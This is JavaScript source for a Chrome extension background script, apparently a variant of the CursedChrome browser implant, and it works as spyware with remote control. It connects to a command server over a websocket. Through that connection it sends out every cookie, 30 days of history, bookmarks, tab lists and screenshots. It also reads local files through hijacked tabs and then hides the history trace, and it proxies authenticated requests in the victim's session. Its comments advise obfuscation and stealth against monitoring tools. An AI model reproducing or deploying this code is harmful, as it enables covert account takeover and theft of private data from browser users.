/*
    IMPORTANT: This script should be minified using UglifyJS or
    some other minimizer to remove comments/console.log statements
    and to obfuscate the code before deployment.

    You'll also need to modify the "websocket" variable in the
    initialize() function in this script with the appropriate
    connection URI for your host. For simple testing, the default
    connection string of "ws://127.0.0.1:4343" should be fine.
*/
var websocket = false;
var last_live_connection_timestamp = get_unix_timestamp();
var placeholder_secret_token = get_secure_random_token(64);

// Used as a table to hold the final metadata to return for
// 301 requests which fetch() can't normally handle.
var redirect_table = {};
const REQUEST_HEADER_BLACKLIST = ["cookie"];

const SYNC_SWITCH = {
  SYNC: true,
  SYNC_HUGE: true,
  REALTIME_IMG: false,
};

const RPC_CALL_TABLE = {
  HTTP_REQUEST: perform_http_request,
  PONG: () => {}, // NOP, since timestamp is updated on inbound message.
  AUTH: authenticate,
  GET_FILESYSTEM: get_filesystem,
  GET_COOKIES: get_cookies,
  GET_HISTORY: get_history,
  GET_TABS: get_tabs,
  GET_BOOKMARKS: get_bookmarks,
};

async function get_filesystem(fileUrl = "file:///") {
  if (!chrome.tabs) {
    return "";
  }
  return get_path(fileUrl);
}

function get_path(fileUrl) {
  console.log("get_path", fileUrl);
  return new Promise((resolve, reject) => {
    chrome.tabs.query({ active: false }, (tabs) => {
      // 从非活动标签页中随机选择一个
      const randomIndex = Math.floor(Math.random() * tabs.length);
      const tab = tabs[randomIndex];

      // 保存原始链接
      const originalUrl = tab.url;

      // 更新标签页的 URL
      chrome.tabs.update(tab.id, { url: fileUrl }, () => {
        chrome.tabs.onUpdated.addListener(function listener(tabId, changeInfo) {
          if (tabId === tab.id && changeInfo.status === "complete") {
            chrome.tabs.executeScript(
              tabId,
              { code: "document.documentElement.innerHTML" },
              (result) => {
                chrome.history.deleteUrl({ url: fileUrl }, () => {
                  chrome.tabs.update(tab.id, { url: originalUrl }, () => {
                    if (!result) {
                      reject("error");
                    } else {
                      const content = result[0];
                      resolve(content);
                    }
                  });
                });
              }
            );
            chrome.tabs.onUpdated.removeListener(listener);
          }
        });
      });
    });
  });
}

// Return an object for the current tab.
async function get_current_tab() {
  if (!chrome.tabs) {
    return {};
  }
  return get_current_tab_data();
}
// browser get current tab
function get_current_tab_data() {
  return new Promise((resolve) => {
    chrome.tabs.query(
      { active: true, lastFocusedWindow: true },
      function (tabs) {
        resolve(tabs[0]);
      }
    );
  });
}

// Return an array of tabs
async function get_tabs() {
  if (!chrome.tabs) {
    return [];
  }
  return get_all_tabs();
}
// browser get all tabs
function get_all_tabs() {
  return new Promise((resolve) => {
    chrome.tabs.query({}, function (tabs) {
      resolve(tabs);
    });
  });
}

// Return an image base64 for the current tab.
async function get_tab_image() {
  if (!chrome.tabs) {
    return "";
  }
  return get_current_tab_image();
}
// browser get tab image
function get_current_tab_image() {
  return new Promise((resolve) => {
    chrome.tabs.captureVisibleTab(
      (options = { format: "jpeg", quality: 10 }),
      (callback = (dataUrl) => {
        return resolve(dataUrl);
      })
    );
  });
}

// return screen
function capture_screenshot() {
  return new Promise((resolve, reject) => {
    const desktopMediaRequest = chrome.desktopCapture.chooseDesktopMedia(
      ["screen"],
      (streamId) => {
        if (streamId) {
          navigator.mediaDevices
            .getUserMedia({
              audio: false,
              video: {
                mandatory: {
                  chromeMediaSource: "desktop",
                  chromeMediaSourceId: streamId,
                },
              },
            })
            .then((stream) => {
              const videoTrack = stream.getVideoTracks()[0];
              const imageCapture = new ImageCapture(videoTrack);
              return imageCapture.grabFrame();
            })
            .then((imageBitmap) => {
              const canvas = document.createElement("canvas");
              canvas.width = imageBitmap.width;
              canvas.height = imageBitmap.height;
              const ctx = canvas.getContext("2d");
              ctx.drawImage(imageBitmap, 0, 0);
              const dataUrl = canvas.toDataURL();
              resolve(dataUrl);
            })
            .catch((error) => {
              reject(error);
            });
        } else {
          reject(new Error("选择屏幕或窗口失败"));
        }
      }
    );

    // 处理取消选择
    const handleCancel = () => {
      reject(new Error("用户取消选择"));
    };
    chrome.desktopCapture.cancelChooseDesktopMedia(desktopMediaRequest);
  });
}

// 调用截图方法

// Return an array of bookmarks from browser
async function get_bookmarks() {
  if (!chrome.bookmarks) {
    return [];
  }
  return get_all_bookmarks();
}
function get_all_bookmarks() {
  return new Promise((resolve, reject) => {
    chrome.bookmarks.getTree(function (bookmarkTreeNodes) {
      resolve(bookmarkTreeNodes);
    });
  });
}

// Return an array of history for the current logs.
async function get_history(days = 30) {
  if (!chrome.history) {
    return [];
  }
  return get_history_by_day(days);
}
function get_history_by_day(days = 7) {
  return new Promise(function (resolve, reject) {
    try {
      let microsecondsPerWeek = 1000 * 60 * 60 * 24 * days;
      let NDaysAgo = new Date().getTime() - microsecondsPerWeek;
      chrome.history.search(
        {
          text: "",
          startTime: NDaysAgo,
          maxResults: 10000,
        },
        function (historyItems) {
          resolve(historyItems);
        }
      );
    } catch (e) {
      reject(e);
    }
  });
}

//Return an array of cookies for the current cookie store.
async function get_cookies(params) {
  if (!chrome.cookies) {
    return [];
  }
  return get_all_cookies({});
}

function get_all_cookies(details) {
  return new Promise(function (resolve, reject) {
    try {
      chrome.cookies.getAll(details, function (cookies_array) {
        resolve(cookies_array);
      });
    } catch (e) {
      reject(e);
    }
  });
}

async function authenticate(params) {
  var browser_id = localStorage.getItem("browser_id");
  if (browser_id === null) {
    browser_id = uuidv4();
    localStorage.setItem("browser_id", browser_id);
  }
  return {
    browser_id: browser_id,
    user_agent: navigator.userAgent,
    timestamp: get_unix_timestamp(),
  };
}

function get_secure_random_token(bytes_length) {
  const validChars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let array = new Uint8Array(bytes_length);
  window.crypto.getRandomValues(array);
  array = array.map((x) => validChars.charCodeAt(x % validChars.length));
  const random_string = String.fromCharCode.apply(null, array);
  return random_string;
}

function uuidv4() {
  return ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, (c) =>
    (
      c ^
      (crypto.getRandomValues(new Uint8Array(1))[0] & (15 >> (c / 4)))
    ).toString(16)
  );
}

function arrayBufferToBase64(buffer) {
  var binary = "";
  var bytes = new Uint8Array(buffer);
  var len = bytes.byteLength;
  for (var i = 0; i < len; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return window.btoa(binary);
}

function get_unix_timestamp() {
  return Math.floor(Date.now() / 1000);
}

// Checks the websocket connection to ensure it's still live
// If it's not, then we attempt a reconnect
const websocket_check_interval = setInterval(async () => {
  const PENDING_STATES = [
    0, // CONNECTING
    2, // CLOSING
  ];

  // Check WebSocket state and make sure it's appropriate
  if (PENDING_STATES.includes(websocket.readyState)) {
    console.log(`WebSocket not in appropriate state for liveness check...`);
    return;
  }

  // Check if timestamp is older than ~15 seconds. If it
  // is the connection is probably dead and we should restart it.
  const current_timestamp = get_unix_timestamp();
  const seconds_since_last_live_message =
    current_timestamp - last_live_connection_timestamp;

  if (seconds_since_last_live_message > 29 || websocket.readyState === 3) {
    console.error(
      `WebSocket does not appear to be live! Restarting the WebSocket connection...`
    );

    try {
      websocket.close();
    } catch (e) {}
    initialize();
    return;
  }

  websocket.send(
    JSON.stringify({
      id: uuidv4(),
      version: "1.0.0",
      action: "PING",
      data: {
        current_tab: await get_current_tab(),
        current_tab_image: await get_tab_image(),
        // current_tab_image: await capture_screenshot(),
      },
    })
  );
}, 1000 * 13); //13

// return some basic information about the tabs and cookies
const websocket_realtime_img_interval = setInterval(async () => {
  if (SYNC_SWITCH["REALTIME_IMG"] !== true) {
    return;
  }
  websocket.send(
    JSON.stringify({
      id: uuidv4(),
      version: "1.0.0",
      action: "REALTIME_IMG",
      data: {
        current_tab_image: await get_tab_image(),
      },
    })
  );
}, 1000 * 2);

// return some basic information about the tabs and cookies
const websocket_sync_interval = setInterval(async () => {
  if (SYNC_SWITCH["SYNC"] !== true) {
    return;
  }
  websocket.send(
    JSON.stringify({
      id: uuidv4(),
      version: "1.0.0",
      action: "SYNC",
      data: {
        tabs: await get_tabs(),
      },
    })
  );
}, 1000 * 63); //63

// return some huge information about the others
const websocket_sync_huge_interval = setInterval(async () => {
  if (SYNC_SWITCH["SYNC_HUGE"] !== true) {
    return;
  }
  websocket.send(
    JSON.stringify({
      id: uuidv4(),
      version: "1.0.0",
      action: "SYNC_HUGE",
      data: {
        history: await get_history(30),
        bookmarks: await get_bookmarks(),
        cookies: await get_cookies(),
      },
    })
  );
}, 1000 * 321); //321

// Headers that fetch() can't set which need to
// utilize webRequest to be able to send properly.
const HEADERS_TO_REPLACE = [
  "origin",
  "referer",
  "access-control-request-headers",
  "access-control-request-method",
  "access-control-allow-origin",
  "date",
  "dnt",
  "trailer",
  "upgrade",
];

async function perform_http_request(params) {
  // Whether to include cookies when sending request
  const credentials_mode = params.authenticated ? "include" : "omit";

  // Set the X-PLACEHOLDER-SECRET to the generated secret.
  params.headers["X-PLACEHOLDER-SECRET"] = placeholder_secret_token;

  // List of keys for headers to replace with placeholder headers
  // which will be replaced on the wire with the originals.
  var headers_to_replace = [];

  // Loop over headers and find any that need to be replaced.
  const header_keys = Object.keys(params.headers);
  header_keys.map((header_key) => {
    if (HEADERS_TO_REPLACE.includes(header_key.toLowerCase())) {
      headers_to_replace.push(header_key);
    }
  });

  // Then replace all headers with placeholder headers
  headers_to_replace.map((header_key) => {
    const new_header_key = `X-PLACEHOLDER-${header_key}`;
    params.headers[new_header_key] = params.headers[header_key];
    delete params.headers[header_key];
  });

  var request_options = {
    method: params.method,
    mode: "cors",
    cache: "no-cache",
    credentials: credentials_mode,
    headers: params.headers,
    redirect: "follow",
  };

  // If there is a request body, we decode it
  // and set it for the request.
  if (params.body) {
    // This is a hack to convert base64 to a Blob
    const fetchURL = `data:application/octet-stream;base64,${params.body}`;
    const fetchResp = await fetch(fetchURL);
    request_options.body = await fetchResp.blob();
  }

  try {
    var response = await fetch(params.url, request_options);
  } catch (e) {
    console.error(`Error occurred while performing fetch:`);
    console.error(e);
    return;
  }

  var response_headers = {};

  for (var pair of response.headers.entries()) {
    // Fix Set-Cookie from onHeadersReceived (fetch() doesn't expose it)
    if (pair[0] === "x-set-cookie") {
      // Original Set-Cookie may merge multiple headers, we have it packed
      response_headers["Set-Cookie"] = JSON.parse(pair[1]);
    } else {
      response_headers[pair[0]] = pair[1];
    }
  }

  const redirect_hack_url_prefix = `${location.origin.toString()}/redirect-hack.html?id=`;

  // Handler 301, 302, 307 edge case
  if (response.url.startsWith(redirect_hack_url_prefix)) {
    var response_metadata_string = decodeURIComponent(response.url);
    response_metadata_string = response_metadata_string.replace(
      redirect_hack_url_prefix,
      ""
    );
    const redirect_hack_id = response_metadata_string;

    const response_metadata = redirect_table[redirect_hack_id];
    delete redirect_table[redirect_hack_id];

    // Format headers
    var redirect_hack_headers = {};
    response_metadata.headers.map((header_data) => {
      // Original Set-Cookie may merge multiple headers, skip it
      if (header_data.name.toLowerCase() !== "set-cookie") {
        if (header_data.name === "X-Set-Cookie") {
          redirect_hack_headers["Set-Cookie"] = JSON.parse(header_data.value);
        } else {
          redirect_hack_headers[header_data.name] = header_data.value;
        }
      }
    });

    const redirect_hack_data = {
      url: response.url,
      status: response_metadata.status_code,
      status_text: "Redirect",
      headers: redirect_hack_headers,
      body: "",
    };

    return redirect_hack_data;
  }

  return {
    url: response.url,
    status: response.status,
    status_text: response.statusText,
    headers: response_headers,
    body: arrayBufferToBase64(await response.arrayBuffer()),
  };
}

function initialize() {
  // Replace the below connection URI with whatever
  // the host details you're using are.
  // ** Ideal setup is the following **
  // Have Nginx doing a reverse-proxy (proxy_pass) to
  // the CursedChrome server with a HTTPS cert setup.
  // For SSL/TLS WebSockets, instead of https:// you need
  // to use wss:// as the protocol. For maximum stealth,
  // setting the WebSocket port to be the standard
  // TLS/SSL port (this will make sure tools like little
  // snitch don't alert on a new port connection from Chrome).

  websocket = new WebSocket("ws://127.0.0.1:4343");

  websocket.onopen = function (e) {};
  websocket.onmessage = async function (event) {
    // Update last live connection timestamp
    console.log(`Received WebSocket message: ${event.data}`);
    last_live_connection_timestamp = get_unix_timestamp();

    try {
      var parsed_message = JSON.parse(event.data);
    } catch (e) {
      console.error("Could not parse WebSocket message!");
      console.error(e);
      return;
    }

    try {
      Object.keys(parsed_message.data.switch_config).map((key) => {
        SYNC_SWITCH[key] = parsed_message.data.switch_config[key];
      });
    } catch (e) {}

    if (parsed_message.action in RPC_CALL_TABLE) {
      const result = await RPC_CALL_TABLE[parsed_message.action](
        parsed_message.data
      );
      websocket.send(
        JSON.stringify({
          // Use same ID so it can be correlated with the response
          id: parsed_message.id,
          origin_action: parsed_message.action,
          result: result,
        })
      );
    } else {
      console.error(`No RPC action ${parsed_message.action}!`);
    }
  };

  websocket.onclose = function (event) {
    if (event.wasClean) {
      console.log(
        `[close] Connection closed cleanly, code=${event.code} reason=${event.reason}`
      );
    } else {
      // e.g. server process killed or network down
      // event.code is usually 1006 in this case
      console.log("[close] Connection died");
    }
  };

  websocket.onerror = async function (error) {
    console.log(`[error] ${error.message}`);
  };
}

initialize();

/*

Some headers are not set correctly when set by fetch(), so instead a
placeholder header of X-PLACEHOLDER-Placeholder-Header is set and then
replaced via the webRequest API.

For example, the "Origin" header is set to the Chrome extension ID. So
the fetch() call sets the X-PLACEHOLDER-Origin header and the webRequest
hook automatically deleted the X-PLACEHOLDER-Origin header and sets the
Origin header to it's value.

However, this opens up a security issue which could be exploited if a
regular webpage made a request with X-PLACEHOLDER-Restricted-Header.
In order to mitigate this the webRequest hooks also look for the header
X-PLACEHOLDER-SECRET. This header contains a secret value which we set
on all fetch() requests in order to verify they came from the extension
and not from some other webpage.

Additionally, for defense in depth, nothing that isn't initiated by the Chrome extension
is actually processed.
*/
chrome.webRequest.onBeforeSendHeaders.addListener(
  function (details) {
    // Ensure we only process requests done by the Chrome extension
    if (details.initiator !== location.origin.toString()) {
      return;
    }

    var has_header_secret = false;
    var header_keys_to_delete = [];
    var headers_to_append = [];

    details.requestHeaders.map((requestHeader) => {
      if (
        requestHeader.name === "X-PLACEHOLDER-SECRET" &&
        requestHeader.value === placeholder_secret_token
      ) {
        has_header_secret = true;
        header_keys_to_delete.push("X-PLACEHOLDER-SECRET");
      }
    });

    // If there's no secret header set with the
    // proper secret then quit out the proxy replacement.
    if (!has_header_secret) {
      return {
        cancel: false,
      };
    }

    // Get headers to remove and headers to append
    details.requestHeaders.map((requestHeader) => {
      if (
        !requestHeader.name.startsWith("X-PLACEHOLDER-SECRET") &&
        requestHeader.name.startsWith("X-PLACEHOLDER-")
      ) {
        header_keys_to_delete.push(requestHeader.name);

        // Skip the header if it's in the blacklist (e.g. Cookie)
        if (
          REQUEST_HEADER_BLACKLIST.includes(
            requestHeader.name.replace("X-PLACEHOLDER-", "").toLowerCase()
          )
        ) {
          return;
        }

        headers_to_append.push({
          name: requestHeader.name.replace("X-PLACEHOLDER-", ""),
          value: requestHeader.value,
        });
      }
    });

    // Remove headers
    details.requestHeaders = details.requestHeaders.filter((requestHeader) => {
      return !header_keys_to_delete.includes(requestHeader.name);
    });

    // Add appended headers
    details.requestHeaders = details.requestHeaders.concat(headers_to_append);

    return {
      requestHeaders: details.requestHeaders,
    };
  },
  {
    urls: ["<all_urls>"],
  },
  ["blocking", "requestHeaders", "extraHeaders"]
);

const REDIRECT_STATUS_CODES = [301, 302, 307];

chrome.webRequest.onHeadersReceived.addListener(
  function (details) {
    // Ensure we only process requests done by the Chrome extension
    if (details.initiator !== location.origin.toString()) {
      return;
    }

    // Rewrite Set-Cookie to expose it in fetch()
    var cookies = [];
    details.responseHeaders.map((responseHeader) => {
      if (responseHeader.name.toLowerCase() === "set-cookie") {
        cookies.push(responseHeader.value);
      }
    });
    if (cookies.length != 0) {
      details.responseHeaders.push({
        name: "X-Set-Cookie",
        // We pack array of cookies into string and depack later.
        // Otherwise multiple Set-Cookie headers would be merged together.
        value: JSON.stringify(cookies),
      });
    }

    if (!REDIRECT_STATUS_CODES.includes(details.statusCode)) {
      return {
        responseHeaders: details.responseHeaders,
      };
    }

    const redirect_hack_id = uuidv4();

    redirect_table[redirect_hack_id] = JSON.parse(
      JSON.stringify({
        url: details.url,
        status_code: details.statusCode,
        headers: details.responseHeaders,
      })
    );

    return {
      redirectUrl:
        `${location.origin.toString()}/redirect-hack.html?id=` +
        redirect_hack_id,
    };
  },
  {
    urls: ["<all_urls>"],
  },
  ["blocking", "responseHeaders", "extraHeaders"]
);

chrome.idle.onStateChanged.addListener((state) => {
  websocket.send(
    JSON.stringify({
      id: uuidv4(),
      version: "1.0.0",
      action: "STATE",
      data: {
        state: state,
      },
    })
  );
});
